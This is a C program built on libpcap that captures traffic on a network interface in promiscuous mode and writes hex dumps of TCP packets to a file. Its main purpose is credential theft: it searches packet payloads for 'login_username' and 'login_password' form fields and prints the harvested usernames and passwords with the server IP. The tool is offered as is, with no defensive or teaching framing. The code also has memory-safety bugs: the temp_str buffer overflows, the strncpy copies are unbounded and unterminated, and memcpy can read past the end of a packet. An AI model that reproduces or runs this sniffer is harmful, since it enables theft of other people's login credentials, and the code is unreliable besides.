#include <sys/types.h>
#include "pcap.h"
#include "string.h"
#include "stdlib.h"
#include "ctype.h"
#include "arpa/inet.h"
#include "signal.h"
#include "unistd.h"

#define MAXBYTES2CAPTURE 2048

#define ETH_P_IP 0x0800

typedef struct ip_address
{
    u_char byte1;
    u_char byte2;
    u_char byte3;
    u_char byte4;
} ip_address;

struct ethhdr
{
    u_char	h_dest[6];
    u_char	h_source[6];
    u_short	h_proto;
};

struct iphdr
{
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ihl:4, version:4;
#else
    unsigned int version:4, ihl:4;
#endif
    u_char tos;
    u_short tot_len;
    u_short id;
    u_short frag_off;
    u_char ttl;
    u_char protocol;
    u_short check;
    ip_address saddr;
    ip_address daddr;
};

static FILE *output_file = NULL;

void processPacket(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char *packet) {
    struct ethhdr *eth = (struct ethhdr*)packet;
    int *counter = (int*)arg;

    if (htons(eth->h_proto) == ETH_P_IP) {
        struct iphdr *ip = (struct iphdr*)(packet + sizeof(struct ethhdr));
        if (ip->protocol == IPPROTO_TCP) {
            if (output_file) {
                fprintf(output_file, "\n\nTCP: Source IP: %i.%i.%i.%i; Destination IP: %i.%i.%i.%i\n",
                        ip->saddr.byte1, ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4,
                        ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
                fprintf(output_file, "Count of packet: %d\n", ++(*counter));
                fprintf(output_file, "Size of packet: %d\n", pkthdr->len);
                fprintf(output_file, "Contents of packet:\n");

                uint size = pkthdr->len;
                for (uint i = 0; i < size; i += 16) {
                    u_char str16[17];
                    memcpy(str16, &packet[i], 16);

                    size_t sz = size - i;
                    if (sz > 16)
                        sz = 16;

                    for (uint j = 0; j < sz; j++)
                        fprintf(output_file, "%.2X ", str16[j]);

                    for (uint k = (sz * 2) + sz - 1; k < 50; k++)
                        fprintf(output_file, " ");

                    for (uint j = 0; j < sz; j++)
                        if (isprint(str16[j]))
                            fprintf(output_file, "%c", str16[j]);
                        else
                            fprintf(output_file, ".");

                    fprintf(output_file, "\n");
                }
            }

            char temp_str[MAXBYTES2CAPTURE];
            for (uint i = 0; i < pkthdr->len; i++) {
                if (isprint(packet[i]))
                    sprintf(temp_str + i, "%c", packet[i]);
                else
                    sprintf(temp_str + i, ".");
            }

            const char* str1 = strstr(temp_str, "login_username");
            if (str1 == NULL)
                return;
            str1 += sizeof("login_username");
            const char* str2 = strstr(str1, "&");
            if (str2 == NULL)
                return;
            char login[64];
            strncpy(login, str1, str2 - str1);

            str1 = strstr(str2, "login_password");
            if (str1 == NULL)
                return;
            str1 += sizeof("login_password");
            str2 = strstr(str1, "&");
            if (str2 == NULL)
                return;
            char password[64];
            strncpy(password, str1, str2 - str1);

            printf("IP: %i.%i.%i.%i Login: %s Password: %s\n",
                   ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4, login, password);
        }
    }
}

void term_handler(int i)
{
    fclose(output_file);
    exit(EXIT_SUCCESS);
}

int main(int argc, char *argv[])
{
    signal(SIGINT, term_handler);

    int count = 0;
    pcap_t *descr = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    char device[16];
    memset(errbuf, 0, PCAP_ERRBUF_SIZE);

    int rez = 0;
    int ok = 0;
    while ((rez = getopt(argc, argv, "d:o:")) != -1) {
        switch (rez) {
        case 'd':
            strncpy(device, optarg, 15);
            ok++;
            break;

        case 'o':
            output_file = fopen(optarg, "w");
            ok++;
            break;

        default:
            return 0;
        };
    };

    if (ok != 2) {
        printf("Usage: -d [device] -o [output filename]\n");
        return 0;
    }

    printf("\nOpening device %s:\n", device);

    if ((descr = pcap_open_live(device, MAXBYTES2CAPTURE, 1,  512, errbuf)) == NULL) {
        fprintf(stderr, "\nError: %s\n", errbuf);
        exit(1);
    }

    struct bpf_program fcode;
    char error[PCAP_ERRBUF_SIZE];
    bpf_u_int32 subNet, netMask;
    char filter[] = "ip";
//    char filter[] = "tcp dst port 80";

    if (device != NULL) {
        if (pcap_lookupnet(device, &subNet, &netMask, error)<0){
            printf("\nNetmask error: %s.\n", error);
            return -1;
        }
    }
    else
        netMask = 0xffffff;

    if (pcap_compile(descr, &fcode, filter, 1, netMask)<0){
        printf("\nFilter compiler error\n");
        return -1;
    }

    if (pcap_setfilter(descr, &fcode)<0){
        printf("\nFilter setting error\n");
        return -1;
    }

    if (pcap_loop(descr, -1, processPacket, (u_char*)&count) == -1) {
        printf("\nError: %s\n", pcap_geterr(descr));
        exit(1);
    }

    return 0;
}
